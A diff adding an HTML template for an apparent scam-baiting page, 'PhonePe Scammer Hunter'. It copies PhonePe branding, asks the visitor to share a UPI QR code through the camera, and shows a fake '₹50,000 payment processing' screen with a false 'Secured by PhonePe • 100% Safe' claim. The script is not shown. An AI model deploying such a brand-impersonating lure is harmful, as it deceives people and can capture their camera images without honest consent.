@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhonePe Scammer Hunter</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <div class="phonepe-container">
+        <!-- PhonePe Header -->
+        <header class="phonepe-header">
+            <div class="header-content">
+                <div class="phonepe-logo">
+                    <span class="logo-text">PhonePe</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- QR Code Upload Portal -->
+        <div id="payment-section" class="payment-card">
+            <div class="payment-header">
+                <div class="payment-icon">
+                    <img src="https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/phonepe-logo-icon.png" alt="PhonePe" class="phonepe-logo-img">
+                </div>
+                <h1>PhonePe</h1>
+            </div>
+
+            <div class="simple-message">
+                <p>Share your UPI QR to the user</p>
+            </div>
+
+            <button id="start-verification" class="phonepe-btn primary-btn">
+                <span class="btn-icon"></span>
+                Share QR Code
+            </button>
+        </div>
+
+        <!-- Camera Section -->
+        <div id="camera-section" class="camera-section hidden">
+            <div class="camera-header">
+                <h2>Scanning QR Code</h2>
+                <p>Position your UPI QR code within the frame to process payment</p>
+            </div>
+
+            <div class="camera-container">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas" class="hidden"></canvas>
+                <div class="qr-overlay">
+                    <div class="qr-frame"></div>
+                    <div class="qr-instruction">Align QR code here</div>
+                </div>
+            </div>
+
+            <div class="scanning-status">
+                <div class="scanning-indicator">
+                    <div class="scanning-dot"></div>
+                    <span>Scanning QR code...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Section -->
+        <div id="success-section" class="success-section hidden">
+            <div class="success-header">
+                <div class="success-icon">✅</div>
+                <h2>QR Code Scanned Successfully!</h2>
+                <p>Payment is being processed</p>
+            </div>
+
+            <div class="transaction-details">
+                <div class="detail-row">
+                    <span class="label">Status:</span>
+                    <span class="value success-status">Processing Payment</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Amount:</span>
+                    <span class="value">₹50,000</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Method:</span>
+                    <span class="value">UPI QR Code</span>
+                </div>
+            </div>
+
+            <div class="processing-animation">
+                <div class="processing-bar">
+                    <div class="processing-fill"></div>
+                </div>
+                <p>Processing ₹50,000 payment... Please wait</p>
+            </div>
+
+            <div class="success-actions">
+                <button class="phonepe-btn secondary-btn" onclick="window.close()">
+                    <span class="btn-icon">✖️</span>
+                    Close
+                </button>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="phonepe-footer">
+            <p>Secured by PhonePe • 100% Safe</p>
+            <div style="margin-top: 10px; font-size: 12px; color: #666;">
+                <a href="/test-external" style="color: #666; text-decoration: none;">[Test Mode]</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
